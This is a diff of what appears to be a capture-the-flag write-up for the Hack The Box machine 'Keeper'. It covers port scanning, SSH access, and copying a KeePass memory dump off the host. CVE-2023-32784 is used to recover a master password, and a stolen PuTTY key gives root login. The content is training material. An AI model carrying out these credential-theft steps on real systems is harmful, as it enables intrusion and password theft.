@@ -21,7 +21,7 @@ published: true
 
 ```shell
 # live host discovery
-sudo nmap -PA -sn $IP
+sudo nmap -PA -sn 10.10.11.227
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-21 16:26 GMT
 Nmap scan report for 10.10.11.227
 Host is up (0.024s latency).
@@ -30,7 +30,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
 
 ```shell
 # scanning common ports
-sudo nmap -sS -sC -sV -O -Pn --min-rate 10000 $IP
+sudo nmap -sS -sC -sV -O -Pn --min-rate 10000 10.10.11.227
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-21 16:29 GMT
 Nmap scan report for 10.10.11.227
 Host is up (0.025s latency).
@@ -63,7 +63,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 24.75 seconds
 ```
 
-## Web Enumeration
+## Web Server Enumeration
 
 ```shell
 whatweb http://10.10.11.227
@@ -110,7 +110,7 @@ Accept-Ranges: bytes
     alt="Tickets.keeper.htb homepage - Login form" >
 </figure>
 
-> RT 4.4.4 (out-of-date), latest 5.0.5, [release notes](https://docs.bestpractical.com/release-notes/rt/5.0.5) include 3 CVEs.
+> RT 4.4.4 (out-of-date), latest 5.0.5, [release notes](https://docs.bestpractical.com/release-notes/rt/5.0.5) include 3 CVEs. Proved a rabbit hole!
 
 <figure>
     <img src="default_creds_google.png"
@@ -128,4 +128,148 @@ Accept-Ranges: bytes
 </figure>
 
 ## Initial Foothold
+
+```shell
+ssh lnorgaard@$IP
+The authenticity of host '10.10.11.227 (10.10.11.227)' can't be established.
+ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.227' (ED25519) to the list of known hosts.
+lnorgaard@10.10.11.227's password:
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+You have mail.
+Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
+lnorgaard@keeper:~$ ls
+RT30000.zip  user.txt
+```
+
+```shell
+lnorgaard@keeper:~$ netstat -ltn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        7      0 127.0.0.1:9000          0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
+tcp6       0      0 ::1:25                  :::*                    LISTEN
+tcp6       0      0 :::80                   :::*                    LISTEN
+tcp6       0      0 :::22                   :::*                    LISTEN
+```
+
+```shell
+lnorgaard@keeper:~$ netstat -lt
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        8      0 localhost:9000          0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
+tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN
+tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
+tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
+tcp6       0      0 localhost:smtp          [::]:*                  LISTEN
+tcp6       0      0 [::]:http               [::]:*                  LISTEN
+tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
+```
+
+```shell
+lnorgaard@keeper:~$ ls -l
+total 332820
+-rwxr-x--- 1 lnorgaard lnorgaard 253395188 May 24 12:51 KeePassDumpFull.dmp
+-rwxr-x--- 1 lnorgaard lnorgaard      3630 May 24 12:51 passcodes.kdbx
+-rw-r--r-- 1 root      root       87391651 Nov 21 19:18 RT30000.zip
+-rw-r----- 1 root      lnorgaard        33 Nov 21 17:22 user.txt
+```
+
+> The DMP file is primarily associated with the MemoryDump or Minidump file format. It is used in Microsoft Windows operating system to store data that has been dumped from the memory space of the computer. Usually, DMP files are created when a file crashes or an error occurs.
+
+> A KDBX file is a password database created by KeePass Password Safe, a free password manager for Windows. It stores an encrypted database of passwords that can be viewed only using a master password set by the user. KDBX files are used to securely store personal login credentials for Windows, email accounts, FTP sites, e-commerce sites, and other purposes.
+
+<figure>
+    <img src="nvd-cve.png"
+    alt="CVE-2023-32784 description" >
+</figure>
+
+> [CVE-2023-32784 PoC](https://github.com/z-jxy/keepass_dump)
+
+> Transferred `KeePassDumpFull.dmp` & `passcodes.kdbx` locally by opening a Python http.server from the target and using `wget` from my machine.
+
+python3 keepass_dump.py -f ~/htb/keeper/KeePassDumpFull.dmp
+[*] Searching for masterkey characters
+[-] Couldn't find jump points in file. Scanning with slower method.
+[*] 0:  {UNKNOWN}
+[*] 2:  d
+[*] 3:  g
+[*] 4:  r
+[*] 6:  d
+[*] 7:
+[*] 8:  m
+[*] 9:  e
+[*] 10: d
+[*] 11:
+[*] 12: f
+[*] 13: l
+[*] 15: d
+[*] 16: e
+[*] Extracted: {UNKNOWN}dgrd med flde
+
+<figure>
+    <img src="danish_google.png"
+    alt="Searching danish-related words on Google" >
+</figure>
+
+```shell
+sudo apt install keepass2
+keepass2
+```
+<figure>
+    <img src="keepass2.png"
+    alt="Keepass2 application" >
+</figure>
+
+<figure>
+    <img src="keepass2_1.png"
+    alt="Opening file with the Keepass2 application" >
+</figure>
+
+> PuTTY's default format is `.ppk`: copy the contents on the note and copy it to a new file with `.ppk` file extension locally. Then, create a .pem key file using `puttygen`.
+
+```shell
+puttygen key.ppk -O private-openssh -o key.pem
+chmod 400 key.pem
+ls -l
+total 247476
+-rw-r--r-- 1 kali kali 253395188 May 24 11:51 KeePassDumpFull.dmp
+-r-------- 1 kali kali      1675 Nov 21 19:46 key.pem
+-rw-r--r-- 1 root root      1459 Nov 21 19:44 key.ppk
+-rw-r--r-- 1 kali kali      3630 May 24 11:51 passcodes.kdbx
+```
+
+## Privilege Escalation
+
+```shell
+ssh -i key.pem root@10.10.11.227
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+You have new mail.
+Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
+root@keeper:~# ls
+root.txt  RT30000.zip  SQL
+```
+
+<figure>
+    <img src="keeper_pwned.png"
+    alt="Keeper machine pwned" >
+</figure>
 
